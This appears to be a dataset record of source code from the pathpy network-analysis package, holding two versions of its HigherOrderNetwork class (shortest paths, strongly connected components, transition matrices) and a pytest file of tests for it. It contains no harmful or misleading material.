            shortest_paths[e[0]][e[1]].add(e)

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if v != w:
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


    def getDistanceMatrixFirstOrder(self):
        """"""
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """"""

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """"""
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """"""
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """"""
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """"""

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """"""
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """"""

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """"""
        Returns the default string representation of
        this graphical model instance
        """"""
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """"""
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """"""

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """"""
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """"""
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """"""Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """"""

        if _sparse.issparse(A) == False:
            raise TypeError(""A must be a sparse matrix"")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which=""LM"", ncv=lanczosVecs, maxiter=maxiter)
        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """"""
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """"""

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T
/n/n/ntests/test_HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of sequential data
    on pathways and temporal networks using higher- and multi order graphical models

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zürich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import pathpy as pp
import pytest
import numpy as np


slow = pytest.mark.slow


def test_degrees(path_from_edge_file):
    hon_1 = pp.HigherOrderNetwork(path_from_edge_file, k=1)
    expected_degrees = {'1': 52, '2' : 0, '3': 2, '5': 5}
    for v in hon_1.nodes:
        assert expected_degrees[v] == hon_1.outweights[v][1], \
        ""Wrong degree calculation in HigherOrderNetwork""


def test_distance_matrix(path_from_edge_file):
    p = path_from_edge_file
    hon = pp.HigherOrderNetwork(paths=p, k=1)
    d_matrix = hon.getDistanceMatrix()
    distances = []
    for source in sorted(d_matrix):
        for target in sorted(d_matrix[source]):
            distance = d_matrix[source][target]
            if distance < 1e6:
                distances.append(d_matrix[source][target])

    assert np.sum(distances) == 8
    assert np.min(distances) == 0
    assert np.max(distances) == 2


def test_distance_matrix_equal_across_objects(random_paths):
    p1 = random_paths(40, 20, num_nodes=9)
    p2 = random_paths(40, 20, num_nodes=9)
    hon1 = pp.HigherOrderNetwork(paths=p1, k=1)
    hon2 = pp.HigherOrderNetwork(paths=p2, k=1)
    d_matrix1 = hon1.getDistanceMatrix()
    d_matrix2 = hon2.getDistanceMatrix()
    assert d_matrix1 == d_matrix2


@pytest.mark.parametrize('paths,n_nodes,k,e_var,e_sum', (
        (7, 9, 1, 0.7911428035, 123),
        (20, 9, 1, 0.310318549, 112),
        (60, 20, 1, 0.2941, 588),
))
def test_distance_matrix_large(random_paths, paths, n_nodes, k, e_var, e_sum):
    p = random_paths(paths, 20, num_nodes=n_nodes)
    hon = pp.HigherOrderNetwork(paths=p, k=1)
    d_matrix = hon.getDistanceMatrix()
    distances = []
    for i, source in enumerate(sorted(d_matrix)):
        for j, target in enumerate(sorted(d_matrix[source])):
            distance = d_matrix[source][target]
            if distance < 1e16:
                distances.append(d_matrix[source][target])

    assert np.var(distances) == pytest.approx(e_var)
    assert np.sum(distances) == e_sum


def test_shortest_path_length(random_paths):
    N = 10
    p = random_paths(20, 10, N)
    hon = pp.HigherOrderNetwork(p, k=1)
    shortest_paths = hon.getShortestPaths()
    distances = np.zeros(shape=(N, N))
    for i, source in enumerate(sorted(shortest_paths)):
        for j, target in enumerate(sorted(shortest_paths[source])):
            distances[i][j] = len(shortest_paths[source][target])
    assert np.mean(distances) == 1.47
    assert np.var(distances) == pytest.approx(0.4891)
    assert np.max(distances) == 4


def test_node_name_map(random_paths):
    p = random_paths(20, 10, 20)
    hon = pp.HigherOrderNetwork(p, k=1)
    node_map = hon.getNodeNameMap()
    # TODO: this is just an idea of how the mapping could be unique
    assert node_map == {str(i): i+1 for i in range(20)}
/n/n/n",0
163,13360e223925e21d02d6132d342c47fe53abc994,"/pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zürich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """"""
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """"""
    pass


class HigherOrderNetwork:
    """"""
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """"""


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """"""
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """"""

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """""" Returns the number of nodes """"""
        return len(self.nodes)


    def ecount(self):
        """""" Returns the number of links """"""
        return len(self.edges)


    def totalEdgeWeight(self):
        """""" Returns the sum of all edge weights """"""
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """"""
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """"""
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """"""
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """"""
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """"""
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """"""
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """"""
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """"""

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption=""paths""):
        """"""
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """"""
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """"""
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """"""
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
            shortest_paths[e[0]][e[1]].add(e)

        for v in self.nodes:
            for w in self.nodes:
                if v != w:
                    for k in self.nodes:
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


    def getDistanceMatrixFirstOrder(self):
        """"""
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """"""

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """"""
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """"""
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """"""
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """"""

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """"""
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """"""

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """"""
        Returns the default string representation of
        this graphical model instance
        """"""
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """"""
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """"""

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """"""
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """"""
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
